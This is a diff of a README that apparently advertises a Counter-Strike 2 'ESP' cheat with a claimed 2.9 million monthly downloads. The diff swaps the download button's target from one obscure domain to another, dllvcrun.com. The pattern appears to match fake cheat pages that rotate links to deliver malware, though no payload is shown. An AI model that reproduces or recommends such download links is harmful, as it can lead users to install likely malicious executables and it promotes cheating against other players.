@@ -49,7 +49,7 @@ A: Yes — all enemies shown on your minimap.
 
 **Monthly downloads:** 2.9m+
 
-[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/cs2esp26)
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/cs2esp26)
 
 ---
 
